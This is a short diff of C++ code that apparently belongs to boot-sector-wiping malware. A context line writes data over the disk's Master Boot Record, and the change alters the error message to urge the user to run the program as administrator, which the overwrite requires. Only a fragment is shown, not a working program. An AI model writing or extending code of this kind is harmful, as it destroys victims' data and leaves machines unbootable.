@@ -33,7 +33,7 @@ if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
 
 }
 else {
-    cout << "Failed code execution...";
+    cout << "Start me as administrator! Failed code execution.";
     Sleep(5000);
     CloseHandle(MasterBootRecord);
     ExitProcess(0);
